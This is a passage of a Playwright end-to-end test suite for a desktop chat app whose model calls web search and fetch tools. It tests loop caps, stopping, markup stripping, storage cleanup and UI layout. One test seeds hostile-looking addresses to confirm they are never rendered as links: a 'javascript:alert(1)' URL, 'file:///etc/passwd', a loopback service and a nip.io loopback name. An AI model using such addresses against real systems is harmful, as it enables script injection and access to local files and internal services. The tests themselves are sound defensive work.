    const switchOff = offered(offBodies.at(-1));
    // The switch-off half also requires that it actually sent a request: a
    // page that crashed before sending must not read as "offered nothing",
    // which is what would make this pass for the wrong reason.
    check(
      "tools: offered only when the switch is on and a command can run them",
      withDoor === 2 && switchOff === 0 && offBodies.length >= 1,
      `on with door ${withDoor}, switch off ${switchOff} (${offBodies.length} sent)`,
    );
    check(
      "tools: a page with no desktop has no server and sends nothing",
      plainBodies.length === 0,
      `no-desktop page sent ${plainBodies.length}`,
    );

    await page.reload();
    await page.waitForTimeout(1200);
    const chat = page.locator(".brain-bar-chat");
    if ((await chat.count()) > 0) await chat.first().click();
    await page.waitForTimeout(800);
    await openSidebar(page, "weather");
    await page.waitForTimeout(400);
    const after = (await page.locator(".thread").textContent()) ?? "";
    check("tools: reload keeps what was searched", after.includes("Searched for"));
    check("tools: reload keeps the answer", after.includes("mild"));
    await page
      .locator(".tool-run > summary")
      .first()
      .click({ timeout: 5000 })
      .catch(() => check("tools: reload keeps the run", false, "no tool block after reload"));
    const opened = (await page.locator(".tool-run").first().textContent()) ?? "";
    check("tools: reload keeps the sources", opened.includes("example.com"), opened.slice(0, 200));

    await browser.close();
  },

  // What a tool result costs the transcript. The turn that ran the tool reads
  // all of it; what stays on disk — and what every later turn sends — is the
  // beginning, so one page cannot sit in browser storage for the life of the
  // conversation.
  async toolskept() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    const long = `1. A very long result\n   URL: https://example.com/long\n   ${"x".repeat(4000)}`;
    await stubDoor(page, { search: long });
    await seedOnce(page, toolSettings("tools-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Search for something.", "mild");

    const wired = (await allBodies(page)).at(-1)?.messages ?? [];
    const result = wired.filter((m) => m.role === "tool")[0];
    check("kept: the turn itself read the whole result", (result?.content ?? "").length > 4000, String((result?.content ?? "").length));

    await page
      .waitForFunction(
        () =>
          Object.keys(localStorage).some(
            (k) =>
              k.startsWith("crescent-chat.msgs.") &&
              (JSON.parse(localStorage.getItem(k) ?? "[]") ?? []).some((m) => (m.toolRuns ?? []).length > 0),
          ),
        null,
        { timeout: 10000 },
      )
      .catch(() => check("kept: the run reached the disk", false, "never written"));
    const stored = await page.evaluate(() => ({ ...localStorage }));
    const key = Object.keys(stored).find((k) => k.startsWith("crescent-chat.msgs."));
    const run = JSON.parse(stored[key] ?? "[]").find((m) => (m.toolRuns ?? []).length > 0)?.toolRuns[0];
    check(
      "kept: the transcript keeps only the beginning, and says so",
      run !== undefined && run.result.length < 1400 && run.result.includes("not kept after the turn"),
      `kept ${run?.result?.length ?? 0} chars`,
    );
    await browser.close();
  },

  // A page fetch, which is the other tool and a different command.
  async toolsfetch() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON, fetch: "The page says the answer is 42." });
    await seedOnce(page, toolSettings("toolsfetch-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Open that page for me.", "page says");

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => String(c.command).startsWith("brain_web_"));
    check("fetch: the page was opened through its own command", calls.length === 1 && calls[0].command === "brain_web_fetch", JSON.stringify(calls));
    check("fetch: the address survived as an argument", calls[0]?.args?.url === "https://example.com/page", JSON.stringify(calls[0]?.args));
    const wired = (await allBodies(page)).at(-1)?.messages ?? [];
    const asked = wired.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).pop();
    check("fetch: the call went back named as web_fetch", asked?.tool_calls?.[0]?.function?.name === "web_fetch");
    const text = (await page.locator(".thread").textContent()) ?? "";
    check("fetch: the thread says it read the page", text.includes("Read example.com"), text.slice(0, 200));
    await browser.close();
  },

  // Two calls in one round and a third in the next: serial execution, in
  // order, with one result per call each time.
  async toolsrounds() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON, fetch: "The page text." });
    await seedOnce(page, toolSettings("toolstwo-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Search twice and read a page.", "Both searches");

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => String(c.command).startsWith("brain_web_"));
    check(
      "rounds: three calls ran, in the order the model asked",
      calls.map((c) => c.command).join(",") === "brain_web_search,brain_web_fetch,brain_web_search",
      JSON.stringify(calls.map((c) => `${c.command}:${c.args.query ?? c.args.url}`)),
    );
    const bodies = await allBodies(page);
    check("rounds: three requests, one per round", bodies.length === 3, String(bodies.length));
    check(
      "rounds: the first round carried two results for two calls",
      (bodies[1]?.messages ?? []).filter((m) => m.role === "tool").length === 2,
      String((bodies[1]?.messages ?? []).filter((m) => m.role === "tool").length),
    );
    check(
      "rounds: the last round carried three calls' worth of history",
      (bodies[2]?.messages ?? []).filter((m) => m.role === "tool").length === 3,
      String((bodies[2]?.messages ?? []).filter((m) => m.role === "tool").length),
    );
    const runs = await page.locator(".tool-run").count();
    check("rounds: the thread shows all three", runs === 3, String(runs));
    check("rounds: the answer arrived", ((await page.locator(".thread").textContent()) ?? "").includes("Both searches"));
    await browser.close();
  },

  // Arguments that are not JSON: nothing must run, the turn must survive, and
  // the model must be told why.
  async toolsbad() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsbad-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Search for something.", "still say");

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => String(c.command).startsWith("brain_web_"));
    check("bad: a broken call never reached the door", calls.length === 0, JSON.stringify(calls));
    const wired = (await allBodies(page)).at(-1)?.messages ?? [];
    const result = wired.filter((m) => m.role === "tool")[0];
    check("bad: the model was told, as a tool result", (result?.content ?? "").includes("not valid JSON"), (result?.content ?? "").slice(0, 120));
    const text = (await page.locator(".thread").textContent()) ?? "";
    check("bad: the thread shows the failure, not a silent call", text.includes("That search did not run"), text.slice(0, 200));
    check("bad: the turn still produced an answer", text.includes("still say"));
    await browser.close();
  },

  // A model that keeps asking for tools: the loop must stop at the cap and ask
  // for words instead of running forever.
  async toolsloop() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsloop-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Keep looking until you know.", "looked enough", 40000);

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => String(c.command).startsWith("brain_web_"));
    check("loop: the cap stopped the searching at four", calls.length === 4, String(calls.length));
    const bodies = await allBodies(page);
    check("loop: four rounds of tools, then one round of words", bodies.length === 5, String(bodies.length));
    check(
      "loop: every round but the last was allowed to call tools",
      bodies.slice(0, 4).every((b) => b.tool_choice === "auto") && bodies[4]?.tool_choice === "none",
      bodies.map((b) => b.tool_choice).join(","),
    );
    check("loop: the forced round still offered the tools", (bodies[4]?.tools ?? []).length === 2);
    check("loop: the answer arrived", ((await page.locator(".thread").textContent()) ?? "").includes("looked enough"));
    await browser.close();
  },

  // Stop, pressed while a tool is running: the turn ends at once and Rust is
  // told to stop the call it is no longer waiting for.
  async toolsstop() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { hang: true });
    await seedOnce(page, toolSettings("toolsslow-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await page.getByRole("textbox", { name: "Message" }).fill("Search for something.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    // Wait until the tool is actually in flight, then stop.
    await page.locator(".tool-working").first().waitFor({ timeout: 10000 }).catch(() => check("stop: the tool started", false, "never showed as running"));
    await page.waitForTimeout(400);
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page.waitForTimeout(1200);

    const calls = await page.evaluate(() => window.__TOOL_CALLS__ ?? []);
    const search = calls.find((c) => c.command === "brain_web_search");
    const stop = calls.find((c) => c.command === "brain_web_stop");
    check("stop: the search was in flight", search !== undefined, JSON.stringify(calls));
    check("stop: Rust was told to stop that exact call", stop !== undefined && stop.args?.id === search?.args?.id, JSON.stringify({ stop: stop?.args, search: search?.args }));
    const text = (await page.locator(".thread").textContent()) ?? "";
    check("stop: the turn stopped instead of waiting for the network", text.includes("Stopped early"), text.slice(0, 200));
    check("stop: the composer is free again", (await page.locator(".composer-stop").count()) === 0);
    await browser.close();
  },

  // Nothing a model or a page wrote becomes clickable unless it is a public web
  // address. The transcript here is seeded, so it is also the reload path.
  async toolslinks() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "links",
          title: "Addresses",
          createdAt: 1,
          updatedAt: 2,
          messages: [
            { id: "u1", role: "user", content: "Open something.", createdAt: 1 },
            {
              id: "a1",
              role: "assistant",
              content: "I opened the address you gave me.",
              createdAt: 2,
              toolRuns: [
                {
                  id: "link1",
                  name: "web_fetch",
                  arguments: '{"url":"javascript:alert(1)"}',
                  result: "The page says the answer is 42.",
                  state: "failed",
                },
                {
                  id: "link2",
                  name: "web_search",
                  arguments: '{"query":"a secret question"}',
                  result:
                    "1. Local service\n   URL: http://127.0.0.1:8130/v1/models\n   An internal thing.\n\n2. File\n   URL: file:///etc/passwd\n   Not a page.\n\n3. Loopback by name\n   URL: https://foo.127.0.0.1.nip.io/\n   Still this machine.\n\n4. Real page\n   URL: https://example.com/ok\n   A real page.",
                  state: "ok",
                },
              ],
            },
          ],
        },
      ],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Addresses");
    await page.waitForTimeout(400);
    await page.locator(".tool-run").first().waitFor({ timeout: 8000 });
    for (const summary of await page.locator(".tool-run > summary").all()) await summary.click();

    // One assertion for both directions: exactly the one public address is
    // offered as something to open. A page that offers none fails it, so it
    // cannot pass by rendering nothing.
    const links = await page.locator(".tool-activity .tool-link").allTextContents();
    check(
      "links: exactly the public web address is offered to open",
      links.length === 1 && links[0] === "example.com",
      JSON.stringify(links),
    );
    const shown = (await page.locator(".tool-activity").textContent()) ?? "";
    check("links: no address that resolves back to this machine is offered", !shown.includes("foo.127.0.0.1.nip.io"), shown.slice(0, 300));
    // Shown as text, never as something to open: the refusal is a rendering
    // decision (`publicUrl.ts`), and this is that decision asserted.
    const offered = await page.locator(".tool-activity .tool-link").allTextContents();
    check(
      "links: a script address is shown as text, never offered to open",
      shown.includes("javascript:alert(1)") && offered.every((label) => !shown.includes(`Asked for: ${label}`) || label === "example.com"),
      JSON.stringify({ offered, shown: shown.slice(0, 120) }),
    );

    // Nothing in the page may reach the outside world on its own: the click is
    // a command, and Rust decides. A plain `href` did nothing at all in the
    // Tauri webview — underlined, cursor changes, no browser (2026-09-19).
    await page.locator(".tool-activity .tool-link").first().click();
    await page.waitForTimeout(400);
    const opened = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((call) => call.command === "brain_open_url");
    check(
      "links: clicking one asks Rust to open it",
      opened.length === 1 && opened[0].args?.url === "https://example.com/ok",
      JSON.stringify(opened),
    );
    await browser.close();
  },

  // Tool-call markup, in the two situations that matter, plus the one where
  // nothing should be hidden at all. The owner's live case (2026-09-19): he
  // asked the model to show him the tags, the model wrote <tool_call> fourteen
  // times without closing it, and the stripper ate the whole 2,603-character
  // answer — the page sat on "thinking" and nothing ever appeared.
  async markup() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });

    // An ordinary round, tools offered: the tags are part of the answer.
    const shown = await browser.newPage();
    await stubDoor(shown, { search: LISBON });
    await seedOnce(shown, toolSettings("toolsshowmarkup-demo"));
    await openChat(shown);
    await shown.waitForTimeout(1200);
    await sendAndWait(shown, "Show me the tool-call tags.", "that is the format.");
    const asked = (await shown.locator(".thread").textContent()) ?? "";
    check("markup: the words around the tags are shown", asked.includes("Here is the syntax:"), asked.slice(0, 200));
    check(
      "markup: and the tags the user asked to see are shown",
      asked.includes("<tool_call>") && asked.includes("</tool_call>"),
      asked.slice(0, 240),
    );
    await shown.close();

    // The capped round, tools offered and the call forbidden: invented markup.
    const capped = await browser.newPage();
    await stubDoor(capped, { search: LISBON });
    await seedOnce(capped, toolSettings("toolshidemarkup-demo"));
    await openChat(capped);
    await capped.waitForTimeout(1200);
    await sendAndWait(capped, "One more search?", "I cannot answer in words.", 40000);
    const hid = (await capped.locator(".thread").textContent()) ?? "";
    check("markup: the words of the capped answer are shown", hid.includes("I cannot answer in words."), hid.slice(0, 200));
    check(
      "markup: and the invented call in it is not",
      !hid.includes("tool_call") && !hid.includes("parameter"),
      hid.slice(0, 260),
    );
    await capped.close();

    // No tools were offered, so no call was forbidden and nothing may be
    // hidden: the same characters, and the reader may want them.
    const plain = await browser.newPage();
    await seed(plain, { settings: okSettings("markup-demo") });
    await openChat(plain);
    await plain.waitForTimeout(1200);
    // Waited to the last line of the leaked text: the markup is part of the
    // answer now, so it arrives with it and a prefix marker would assert on a
    // half-rendered stream.
    await sendAndWait(plain, "One more search?", "</tool_call>");
    const open = (await plain.locator(".thread").textContent()) ?? "";
    check("markup: with no tools offered nothing is hidden", open.includes("<tool_call>"), open.slice(0, 240));
    check("markup: and the answer is all there", open.includes("weather in Tokyo today"), open.slice(0, 300));
    await plain.close();

    await browser.close();
  },

  // A round that spends itself on calls and produces no words. Live, 2026-09-19,
  // the model answered "show me the <tool_call> format" with 40 structured
  // web_search calls, no content, finish_reason "length" — so the calls were
  // refused, the turn returned, and the reader got nothing at all.
  async toolsburn() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsburn-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Show me the tags.", "the answer is 42", 40000);
    const text = (await page.locator(".thread").textContent()) ?? "";
    check("burn: an answer arrives even though the calls were refused", text.includes("the answer is 42"), text.slice(0, 200));
    check("burn: the refused call is on the record too", text.includes("ended the turn as"), text.slice(0, 260));
    const bodies = await allBodies(page);
    check("burn: the fallback round asked for words", bodies.at(-1)?.tool_choice === "none", JSON.stringify(bodies.map((b) => b.tool_choice)));
    await browser.close();
  },

  // What the store does with payloads the index does not name: it must never
  // take an unreadable index as evidence that they are junk, it must leave a
  // payload that might still be being written, and it must still clear real
  // junk. Each phase opens its own page, because the sweep runs as the store
  // opens.
  async orphans() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    /** A page whose storage is planted after `seed`'s clear (init scripts run in order). */
    const opened = async (plant) => {
      const page = await browser.newPage();
      await seed(page, { settings: okSettings("x") });
      await page.addInitScript(plant);
      await page.goto(APP);
      await page.waitForTimeout(1200);
      return page;
    };
    const payloads = (page) =>
      page.evaluate(() => Object.keys({ ...localStorage }).filter((k) => k.startsWith("crescent-chat.msgs.")).sort());

    const corrupt = await opened(() => {
      localStorage.setItem("crescent-chat.index.v2", "{ not json at all");
      // Deliberately old: the grace window must not be what saves these, or the
      // check would pass for the wrong reason. Only "an unreadable index is not
      // evidence" can keep them.
      const old = Date.now() - 10 * 60 * 1000;
      const message = (id, content) => JSON.stringify([{ id, role: "user", content, createdAt: old }]);
      localStorage.setItem("crescent-chat.msgs.a.v2", message("m1", "keep me"));
      localStorage.setItem("crescent-chat.msgs.b.v2", message("m2", "keep me too"));
    });
    const kept = await payloads(corrupt);
    check("orphans: an index that cannot be read never authorises a deletion", kept.length === 2, JSON.stringify(kept));
    await corrupt.close();

    const windowed = await opened(() => {
      localStorage.setItem("crescent-chat.index.v2", "[]");
      const message = (id, content, createdAt) => JSON.stringify([{ id, role: "user", content, createdAt }]);
      localStorage.setItem("crescent-chat.msgs.fresh.v2", message("m3", "just written", Date.now()));
      localStorage.setItem("crescent-chat.msgs.old.v2", message("m4", "long abandoned", Date.now() - 10 * 60 * 1000));
      localStorage.setItem("crescent-chat.msgs.empty.v2", "[]");
    });
    const left = await payloads(windowed);
    check("orphans: a payload younger than the grace window is left alone", left.includes("crescent-chat.msgs.fresh.v2"), JSON.stringify(left));
    check("orphans: an old unnamed payload is still swept", !left.includes("crescent-chat.msgs.old.v2"), JSON.stringify(left));
    check("orphans: a payload with nothing in it is swept", !left.includes("crescent-chat.msgs.empty.v2"), JSON.stringify(left));
    await windowed.close();

    // A brand-new conversation whose index write fails must leave nothing behind.
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await page.addInitScript(() => {
      const real = Storage.prototype.setItem;
      Storage.prototype.setItem = function (key, value) {
        if (key === "crescent-chat.index.v2" && sessionStorage.getItem("block-index") === "1") {
          throw new DOMException("exceeded the quota", "QuotaExceededError");
        }
        return real.call(this, key, value);
      };
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.evaluate(() => sessionStorage.setItem("block-index", "1"));
    await openChat(page);
    await page.waitForTimeout(1000);
    await page.getByRole("textbox", { name: "Message" }).fill("This one cannot be filed.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2500);
    const after = await page.evaluate(() => ({
      keys: Object.keys({ ...localStorage }).filter((k) => k.startsWith("crescent-chat.msgs.")),
      index: localStorage.getItem("crescent-chat.index.v2"),
    }));
    check("orphans: a failed index write leaves no payload behind", after.keys.length === 0, JSON.stringify(after.keys));
    check("orphans: and the index still names nothing", !(after.index ?? "").includes("This one cannot be filed"), (after.index ?? "").slice(0, 120));
    const thread = (await page.locator(".thread").textContent()) ?? "";
    check("orphans: the session keeps what the disk refused", thread.includes("This one cannot be filed"), thread.slice(0, 160));
    await browser.close();
  },

  // A reloaded conversation must never be rebuilt into a request a strict
  // server would reject. A refused run — one the stream never named, or one
  // with no round left — was never an exchange on the wire, so it must not
  // come back as an assistant tool_calls message.
  async wirehistory() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "history",
          title: "With history",
          createdAt: 1,
          updatedAt: 2,
          messages: [
            { id: "u1", role: "user", content: "Look something up.", createdAt: 1 },
            {
              id: "a1",
              role: "assistant",
              content: "I looked it up.",
              createdAt: 2,
              toolRuns: [
                { id: "0-call_1", name: "web_search", arguments: '{"query":"a fact"}', result: "1. A fact\n   URL: https://example.com/fact", state: "ok" },
                { id: "0-", name: "", arguments: "{}", result: "The stream ended before this call's name arrived, so nothing was run.", state: "refused" },
                { id: "1-call_9", name: "web_fetch", arguments: '{"url":"https://example.com/"}', result: "There was no round left to run this.", state: "refused" },
              ],
            },
          ],
        },
      ],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "With history");
    await page.waitForTimeout(400);
    await resetMock(page);
    await sendAndWait(page, "And now?", "line is open");

    const wired = (await allBodies(page)).at(-1)?.messages ?? [];
    const exchanges = wired.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls));
    check("history: only the run that really happened is rebuilt", exchanges.length === 1 && exchanges[0].tool_calls.length === 1, JSON.stringify(exchanges.map((m) => m.tool_calls?.length)));
    check("history: and its name is a name", exchanges[0]?.tool_calls?.[0]?.function?.name === "web_search", JSON.stringify(exchanges[0]?.tool_calls));
    const names = exchanges.flatMap((m) => m.tool_calls.map((call) => call.function?.name ?? ""));
    const ids = exchanges.flatMap((m) => m.tool_calls.map((call) => call.id));
    check("history: no empty function name reaches the wire", names.every((name) => name !== ""), JSON.stringify(names));
    check("history: no id is repeated", new Set(ids).size === ids.length, JSON.stringify(ids));
    const toolMessages = wired.filter((m) => m.role === "tool");
    check("history: one result, for the call that was sent", toolMessages.length === 1 && toolMessages[0].tool_call_id === ids[0], JSON.stringify(toolMessages.map((m) => m.tool_call_id)));
    await browser.close();
  },

  // Two rounds in which the server reuses one call id: the transcript must keep
  // both exchanges, not have the second erase the first.
  async toolrepeat() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsrepeat-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "Search twice.", "answer is 42", 40000);

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => String(c.command).startsWith("brain_web_"));
    check("repeat: both rounds ran their search", calls.length === 2, JSON.stringify(calls.map((c) => c.args.query)));
    const bodies = await allBodies(page);
    const wired = bodies.at(-1)?.messages ?? [];
    const exchanges = wired.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls));
    const ids = exchanges.flatMap((m) => m.tool_calls.map((call) => call.id));
    check("repeat: both exchanges are on the wire", exchanges.length === 2, JSON.stringify(exchanges.map((m) => m.tool_calls?.length)));
    check("repeat: and their ids are distinct despite the server reusing one", new Set(ids).size === 2, JSON.stringify(ids));
    const runs = await page.locator(".tool-run").count();
    check("repeat: the thread shows both runs", runs === 2, String(runs));
    // The thread renders from the live buffer; the disk trails it.
    await page
      .waitForFunction(
        () =>
          Object.keys(localStorage).some(
            (k) =>
              k.startsWith("crescent-chat.msgs.") &&
              (JSON.parse(localStorage.getItem(k) ?? "[]") ?? []).some((m) => (m.toolRuns ?? []).length >= 2),
          ),
        null,
        { timeout: 10000 },
      )
      .catch(() => check("repeat: both runs reached the disk", false, "never written"));
    const stored = await page.evaluate(() => ({ ...localStorage }));
    const key = Object.keys(stored).find((k) => k.startsWith("crescent-chat.msgs."));
    const message = JSON.parse(stored[key] ?? "[]").find((m) => (m.toolRuns ?? []).length > 0);
    const runIds = (message?.toolRuns ?? []).map((run) => run.id);
    check("repeat: the transcript keeps both runs", runIds.length === 2 && new Set(runIds).size === 2, JSON.stringify(runIds));
    await browser.close();
  },

  // Two answers that arrive without SSE, and what the client must do with each.
  async jsonpaths() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });

    const page = await browser.newPage();
    await seed(page, { settings: okSettings("casestream-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Is this a stream?", "still a stream");
    check("stream: a media type in any case is still a stream", ((await page.locator(".thread").textContent()) ?? "").includes("Mixed case is still a stream."), ((await page.locator(".thread").textContent()) ?? "").slice(0, 160));
    await page.close();

    const markup = await browser.newPage();
    await seed(markup, { settings: okSettings("jsonmarkup-demo") });
    await openChat(markup);
    await markup.waitForTimeout(1200);
    await sendAndWait(markup, "Show me the syntax.", "That was the markup.");
    const text = (await markup.locator(".thread").textContent()) ?? "";
    check("json: the words around the call are shown", text.includes("Here is the syntax."), text.slice(0, 200));
    // The hiding rule is "only in a round where a call was forbidden" (see
    // `markup`), and this chat offered no tools: nothing is hidden, so the whole
    // answer arrives — tags included. Asserted rather than assumed, because the
    // alternative silently ate an answer once.
    check("json: with no tools offered the tags come through", text.includes("<tool_call>") && text.includes("</tool_call>"), text.slice(0, 240));
    check("json: the text after it is kept too", text.includes("That was the markup."), text.slice(-120));
    await browser.close();
  },

  // Thinking is "answer me now instead of reasoning first" — worth tens of
  // seconds a message — so it lives on the composer, not above twenty-six
  // sampler knobs on Advanced, where the owner could not find it. The switch is
  // offered only when the model's own chat template reads it, and the choice
  // reaches the next request with no reload.
  async thinking() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1500);

    const toggle = page.locator(".composer").getByRole("button", { name: /thinking/i });
    check("thinking: the composer offers it", (await toggle.count()) === 1, "no thinking control on the composer");
    check("thinking: it starts on", (await toggle.getAttribute("aria-pressed")) === "true", String(await toggle.getAttribute("aria-pressed")));

    await resetMock(page);
    await toggle.click();
    await page.waitForTimeout(300);
    check("thinking: it turns off", (await toggle.getAttribute("aria-pressed")) === "false", String(await toggle.getAttribute("aria-pressed")));

    await page.getByRole("textbox", { name: "Message" }).fill("Answer quickly.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2500);
    const body = (await allBodies(page)).at(-1);
    check(
      "thinking: the next message asks the template not to think",
      JSON.stringify(body?.chat_template_kwargs) === '{"enable_thinking":false}',
      JSON.stringify(body?.chat_template_kwargs),
    );

    // And it is no longer among the sampler knobs: the page that carries
    // twenty-six of those carries no thinking control.
    await page.getByRole("button", { name: "Show menu" }).click();
    await page.waitForTimeout(300);
    await page.getByRole("button", { name: "Open Home" }).click();
    await page.waitForTimeout(500);
    await page.locator(".brain-settings").getByRole("button", { name: "Advanced" }).click();
    await page.waitForTimeout(800);
    const pageThinking =
      (await page.locator(".surface-page").getByRole("button", { name: /thinking/i }).count()) +
      (await page.locator(".surface-page").getByRole("checkbox", { name: /thinking/i }).count());
    check(
      "thinking: the page with the sampler knobs carries no thinking control",
      pageThinking === 0,
      `${pageThinking} thinking controls on the Advanced page`,
    );
    // A positive control, so the line above cannot pass by the page being blank.
    check(
      "thinking: and the sampler panel is on that page",
      (await page.locator(".sampling-panel").count()) === 1,
      "the sampler panel is not there at all",
    );
    await browser.close();
  },

  // The app's own settings are the app's, and the app's strip is the header: on
  // the Brain home, with no chat open, one step must reach them. They used to be
  // a chip called Settings inside a row called Settings; taking that away
  // without a door left the home with no way at all, and the theme — which
  // moved into Settings — three steps from a page that used to carry it.
  async settingsdoor() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    check("door: the brain home is where the app opens", (await page.locator(".brain-bar").count()) === 1, "the home is not on screen");
    const door = page.locator(".topbar").getByRole("button", { name: "Settings", exact: true });
    check("door: the home reaches Settings in one step", (await door.count()) === 1, "no Settings door in the header on the home");
    await door.first().click();
    await page.waitForTimeout(400);
    check("door: and it opens them", (await page.locator(".settings-page").count()) === 1, "the click did not open Settings");
    // The rule the crescent follows, kept here: no way to the page you are on.
    check(
      "door: not offered on Settings itself",
      (await page.locator(".topbar").getByRole("button", { name: "Settings", exact: true }).count()) === 0,
      "a door to the page already open",
    );
    // And it is not a sixth chip in the machine's row.
    await page.locator(".topbar").getByRole("button", { name: /^Back to / }).first().click();
    await page.waitForTimeout(400);
    const chips = await page.locator(".brain-settings-item").allTextContents();
    check("door: the machine row stays four", chips.length === 4 && !chips.includes("Settings"), JSON.stringify(chips));

    // The reader should be able to tell, without being told: what is in the page
    // is about this computer, what is in the chrome is about the app. A chip in
    // the page reads as important; a word in the corner that looks like a label
    // reads as minor — and Settings is not less important than Advanced.
    const doorSkin = await door.first().evaluate((el) => {
      const skin = getComputedStyle(el);
      return { border: skin.borderTopWidth, background: skin.backgroundColor, colour: skin.color };
    });
    check(
      "door: it is drawn as a button, not a word",
      doorSkin.border !== "0px" && doorSkin.background !== "rgba(0, 0, 0, 0)",
      JSON.stringify(doorSkin),
    );
    const label = await page.locator(".brain-machine-label").first().evaluate((el) => {
      const skin = getComputedStyle(el);
      return { text: el.textContent ?? "", weight: Number(skin.fontWeight), size: parseFloat(skin.fontSize), colour: skin.color };
    });
    check("row: the machine's label says what the row is", label.text.includes("This computer"), JSON.stringify(label));
    check(
      "row: and reads as a heading, not as a quiet footnote",
      label.weight >= 600 && label.size >= 15 && label.colour !== "rgb(128, 128, 128)",
      JSON.stringify(label),
    );
    await browser.close();
  },

  // The writing bar becoming the first message, by hand. It used to be
  // `document.startViewTransition` with a shared `view-transition-name`, and on
  // this machine the effect simply never happened — the pseudo-elements are not
  // inspectable from a test, so a day of "it looks wired" proved nothing. A FLIP
  // is in the DOM: the moving element, its layout, its keyframes and its
  // duration can all be read.
  async handoff() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
    await page.emulateMedia({ reducedMotion: "no-preference" });
    await seed(page, { settings: okSettings("x") });
    await page.goto(APP);
    await page.waitForTimeout(1200);

    const bar = await page.locator(".brain-bar").boundingBox();
    check("handoff: the bar is on the home", bar !== null, "no bar to measure");
    await page.getByRole("textbox", { name: "Write to the brain" }).fill("First message from the bar.");
    await page.getByRole("textbox", { name: "Write to the brain" }).press("Enter");
    // The move exists, and it is measured while it is happening.
    await page
      .locator(`[${handoffAttribute}]`)
      .first()
      .waitFor({ timeout: 1500 })
      .catch(() => check("handoff: the moving element exists", false, "nothing carried the move"));
    const move = await page.evaluate((attribute) => {
      const mover = document.querySelector(`[${attribute}]`);
      if (!mover) return null;
      const animation = mover.getAnimations()[0];
      const keyframes = animation?.effect && "getKeyframes" in animation.effect ? animation.effect.getKeyframes() : [];
      return {
        // The inline box, not the animated one: the animation overrides it at
        // runtime, so this is where the move starts.
        starts: {
          left: parseFloat(mover.style.left),
          top: parseFloat(mover.style.top),
          width: parseFloat(mover.style.width),
          height: parseFloat(mover.style.height),
        },
        text: mover.textContent ?? "",
        duration: animation ? animation.effect?.getTiming().duration : null,
        last: keyframes.length > 0 ? keyframes[keyframes.length - 1] : null,
        scales: keyframes.some((frame) => "transform" in frame || "scale" in frame),
      };
    }, handoffAttribute);
    check("handoff: the moving element exists", move !== null, "no element carried the move");
    // The whole screen changes, and the bar is part of it: the room that is
    // leaving and the room arriving are animated over the same beat, so nothing
    // finishes before the bar lands or visibly after it.
    const rooms = await page.evaluate(
      ({ leaving, arriving }) => {
        const read = (attribute) => {
          const element = document.querySelector(`[${attribute}]`);
          if (!element) return null;
          const animation = element.getAnimations()[0];
